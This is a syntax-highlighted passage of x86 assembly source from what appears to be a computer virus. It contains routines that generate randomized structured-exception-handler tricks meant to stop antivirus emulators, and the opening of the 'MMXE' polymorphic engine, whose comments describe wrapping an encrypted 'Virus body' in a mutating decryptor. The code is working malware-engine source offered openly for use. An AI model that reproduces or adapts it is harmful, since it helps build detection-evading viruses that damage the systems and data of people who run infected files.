    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08Bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11100000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux2</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---</span><span class="sc0">

</span><span class="sc1">; Restoring old SEH handler - type 1:</span><span class="sc0">
</span><span class="sc1">;       POP     DWORD PTR FS:[0000h]</span><span class="sc0">

</span><span class="sc5">@@seh_restore_old_type1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">068F6467h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Restoring old SEH handler - type 2:</span><span class="sc0">
</span><span class="sc1">;       ZERO    REG</span><span class="sc0">
</span><span class="sc1">;       POP     DWORD PTR FS:[REG]</span><span class="sc0">

</span><span class="sc5">@@seh_restore_old_type2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@choose_aux1_reg</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">_EBP</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@seh_restore_old_type2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_zero_reg</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08F64h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---</span><span class="sc0">

</span><span class="sc1">; Fixing stack because new handler - type 1:</span><span class="sc0">
</span><span class="sc1">;       POP     REG</span><span class="sc0">

</span><span class="sc5">@@stack_fix_nh_type1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@choose_aux1_reg</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Fixing stack because new handler - type 2:</span><span class="sc0">
</span><span class="sc1">;   eq. ADD     ESP,4</span><span class="sc0">

</span><span class="sc5">@@stack_fix_nh_type2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">],</span><span class="sc5">_ESP</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_incpointer</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---</span><span class="sc0">

</span><span class="sc1">; Saving old SEH handler - type 1:</span><span class="sc0">
</span><span class="sc1">;       PUSH    DWORD PTR FS:[0000h]</span><span class="sc0">

</span><span class="sc5">@@seh_save_old_type1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">36FF6467h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Saving old SEH handler - type 2:</span><span class="sc0">
</span><span class="sc1">;       ZERO    REG</span><span class="sc0">
</span><span class="sc1">;       PUSH    DWORD PTR FS:[REG]</span><span class="sc0">

</span><span class="sc5">@@seh_save_old_type2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@choose_aux1_reg</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">_EBP</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@seh_save_old_type2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_zero_reg</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FF64h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00110000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Saving old SEH handler - type 3:</span><span class="sc0">
</span><span class="sc1">;       MOV     REG,DWORD PTR FS:[0000h]</span><span class="sc0">
</span><span class="sc1">;       PUSH    REG</span><span class="sc0">

</span><span class="sc5">@@seh_save_old_type3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@choose_aux1_reg</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">008B6467h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000110b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Saving old SEH handler - type 4:</span><span class="sc0">
</span><span class="sc1">;       ZERO    REG1</span><span class="sc0">
</span><span class="sc1">;       MOV     REG2,DWORD PTR FS:[REG1]</span><span class="sc0">
</span><span class="sc1">;       PUSH    REG2</span><span class="sc0">

</span><span class="sc5">@@seh_save_old_type4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@choose_aux1_reg</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">_EBP</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@seh_save_old_type4</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_zero_reg</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8B64h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@choose_aux2_reg</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux2</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---</span><span class="sc0">

</span><span class="sc1">; Set new SEH handler type 1:</span><span class="sc0">
</span><span class="sc1">;       MOV     FS:[0000h],ESP</span><span class="sc0">

</span><span class="sc5">@@seh_newhnd_type1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">26896467h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Set new SEH handler type 2:</span><span class="sc0">
</span><span class="sc1">;       ZERO    REG</span><span class="sc0">
</span><span class="sc1">;       MOV     FS:[REG],ESP</span><span class="sc0">

</span><span class="sc5">@@seh_newhnd_type2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@choose_aux1_reg</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">_EBP</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@seh_newhnd_type2</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_zero_reg</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8964h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00100000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_aux1</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Tables for a random construction of SEH trick for stop emulatorz</span><span class="sc0">

</span><span class="sc5">@@stack_fix</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@stack_fix_type1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@stack_fix_type2</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@stack_fix_type3</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@stack_fix_type4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@@s_stack_fix</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@stack_fix</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">@@seh_restore</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@seh_restore_old_type1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@seh_restore_old_type2</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@@s_seh_restore</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@seh_restore</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">@@stack_fix_nh</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@stack_fix_nh_type1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@stack_fix_nh_type2</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@@s_stack_fix_nh</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@stack_fix_nh</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">@@seh_save_old</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@seh_save_old_type1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@seh_save_old_type2</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@seh_save_old_type3</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@seh_save_old_type4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@@s_seh_saveold</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@seh_save_old</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">@@seh_newhnd</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@seh_newhnd_type1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@seh_newhnd_type2</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@@s_seh_newhnd</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@seh_newhnd</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">phire</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">eBlock12</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">; =:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=</span><span class="sc0">
</span><span class="sc1">; [MMXE] - MultiMedia eXtensions Engine v1.01</span><span class="sc0">
</span><span class="sc1">; =:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This  is  a  bugfixed  and improved  version  of  my MMXE v1.00. Enjoy  it!</span><span class="sc0">
</span><span class="sc1">; PS: Of course, this engine is so  far away from  Mental Driller's code, but</span><span class="sc0">
</span><span class="sc1">; at least it tries to be poly, huh? :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Well, the poly decryptor generated with MMXE will be as this one:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       +-------------------+</span><span class="sc0">
</span><span class="sc1">;       |   MMX detection   | ÄÄ¿</span><span class="sc0">
</span><span class="sc1">;       +-------------------+   ³</span><span class="sc0">
</span><span class="sc1">;       |   MMX decryptor   |   ³ [ If not MMX detected ]</span><span class="sc0">
</span><span class="sc1">;       +-------------------+ &lt;ÄÙ</span><span class="sc0">
</span><span class="sc1">;       | Non MMX decryptor |</span><span class="sc0">
</span><span class="sc1">;       +-------------------+ }</span><span class="sc0">
</span><span class="sc1">;       |                   | }</span><span class="sc0">
</span><span class="sc1">;       |    Virus body     | } [ This is the encrypted part :) ]</span><span class="sc0">
</span><span class="sc1">;       |                   | }</span><span class="sc0">
</span><span class="sc1">;       +-------------------+ }</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The generated code doesn't pretend in any  way to seem  realistic: just the</span><span class="sc0">
</span><span class="sc1">; opposite. It generates a lot of nonsenses (very few executables use MMX op-</span><span class="sc0">
</span><span class="sc1">; codes). This can be a problem (or not) depending the viewpoint.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       ECX = Size of code to encrypt</span><span class="sc0">
</span><span class="sc1">;       ESI = Pointer to the data to encrypt</span><span class="sc0">
</span><span class="sc1">;       EDI = Buffer where put the decryptor</span><span class="sc0">
</span><span class="sc1">;       EBP = Delta Offset</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       ECX = Decryptor size</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       All the other registers, preserved.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">; [ Default MMXE settings ]</span><span class="sc0">

</span><span class="sc5">LIMIT</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">800h</span><span class="sc0">                    </span><span class="sc1">; Decryptor size (2K)</span><span class="sc0">
</span><span class="sc5">RECURSION</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">05h</span><span class="sc0">                     </span><span class="sc1">; The recursion level of THME</span><span class="sc0">
</span><span class="sc5">nGARBAGE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">08h</span><span class="sc0">                     </span><span class="sc1">; Sorta level of garbage</span><span class="sc0">

</span><span class="sc1">; [ Registers ]</span><span class="sc0">

</span><span class="sc5">_EAX</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000000b</span><span class="sc0">               </span><span class="sc1">; All these are the numeric</span><span class="sc0">
</span><span class="sc5">_ECX</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000001b</span><span class="sc0">               </span><span class="sc1">; value of all the registers.</span><span class="sc0">
</span><span class="sc5">_EDX</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000010b</span><span class="sc0">               </span><span class="sc1">; Heh, i haven't used here </span><span class="sc0">
</span><span class="sc5">_EBX</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000011b</span><span class="sc0">               </span><span class="sc1">; all this, but... wtf? they</span><span class="sc0">
</span><span class="sc5">_ESP</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000100b</span><span class="sc0">               </span><span class="sc1">; don't waste bytes, and ma-</span><span class="sc0">
</span><span class="sc5">_EBP</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000101b</span><span class="sc0">               </span><span class="sc1">; ke this shit to be more</span><span class="sc0">
</span><span class="sc5">_ESI</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000110b</span><span class="sc0">               </span><span class="sc1">; clear :)</span><span class="sc0">
</span><span class="sc5">_EDI</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000111b</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">; [ MMX registers ]</span><span class="sc0">

</span><span class="sc5">_MM0</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000000b</span><span class="sc0">
</span><span class="sc5">_MM1</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000001b</span><span class="sc0">
</span><span class="sc5">_MM2</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000010b</span><span class="sc0">
</span><span class="sc5">_MM3</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000011b</span><span class="sc0">
</span><span class="sc5">_MM4</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000100b</span><span class="sc0">
</span><span class="sc5">_MM5</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000101b</span><span class="sc0">
</span><span class="sc5">_MM6</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000110b</span><span class="sc0">
</span><span class="sc5">_MM7</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000111b</span><span class="sc0">

</span><span class="sc1">; [ Internal flags ]</span><span class="sc0">

</span><span class="sc5">_CHECK4MMX</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0000000000000001b</span><span class="sc0">
</span><span class="sc5">_DELTAOFFSET</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0000000000000010b</span><span class="sc0">
